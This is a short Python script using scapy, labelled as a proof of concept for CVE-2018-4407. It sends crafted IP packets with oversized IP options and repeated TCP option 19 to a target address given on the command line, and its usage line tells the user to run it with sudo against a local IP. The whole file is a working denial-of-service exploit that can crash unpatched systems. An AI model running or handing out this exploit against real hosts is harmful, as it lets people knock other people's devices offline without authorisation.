# CVE-2018-4407 ICMP DoS

import sys

try:
    from scapy.all import *
except Exception as e:
    print ("[*] you need install scapy first!")

if  __name__ == '__main__':
    try:
        check_ip = sys.argv[1]
        for i in range(8,20):
            send(IP(dst=check_ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
        print ("[*] Check Over!! ")
    except Exception as e:
        print "[*] Usage: sudo python icmp_dos.py 192.168.1.x"
